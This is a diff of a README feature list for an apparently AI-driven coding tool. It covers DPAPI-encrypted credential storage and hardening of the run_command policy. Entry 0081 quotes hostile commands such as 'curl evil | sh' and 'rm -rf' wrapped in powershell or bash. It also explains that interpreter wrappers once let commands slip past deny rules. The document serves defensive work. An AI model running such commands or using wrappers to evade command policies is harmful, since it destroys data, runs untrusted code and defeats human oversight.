@@ -15,8 +15,16 @@ below was a `.env` change, never a code change:
 - **thinkingmachines/Inkling on Together** — `https://api.together.xyz/v1`, OpenAI-compatible.
 - **gpt-oss-120b on AWS Bedrock / self-hosted vLLM (RunPod)** — the original baseline; last measured eval 13/13.
 
-## Features (specs/0022–0081)
+## Features (specs/0022–0082)
 
+- `0082` **secrets at rest** — Phase 3: protect the model credential on disk (Windows), stdlib + `icacls`, no
+  pywin32. `CODE_LOCK_SECRETS` ACL-locks `.env` (and any `CODE_LOCK_SECRETS_PATHS`) to owner-only at startup —
+  the Windows `chmod 0600` (strip inheritance, grant Read to the user + Full to SYSTEM). `CODE_SECRETS_VAULT`
+  reads a DPAPI-encrypted `secrets.dat` (crypt32 via ctypes, ciphertext tied to the user account, no key to
+  store) and injects the values into `os.environ` at startup (setdefault — never clobbers a real env value),
+  after which env-scrub (0078) keeps them out of `run_command` children. Off Windows / where ctypes can't load,
+  DPAPI is `Unavailable` and the feature is simply off. `cli._apply_secrets_startup` is best-effort and never
+  breaks launch; all four flags default OFF → byte-identical. (`scripts/check_secretsvault_0082.py`, 9/9.)
 - `0081` **execpolicy hardening** — Phase 2: two run_command policy bypasses closed. (#11) `execpolicy` now
   decomposes an interpreter WRAPPER — `powershell -Command "rm -rf x"`, `bash -lc "curl evil | sh"`, `cmd /c`,
   `powershell -EncodedCommand <b64>` — so the dangerous INNER command is assessed and matched by deny/ask rules
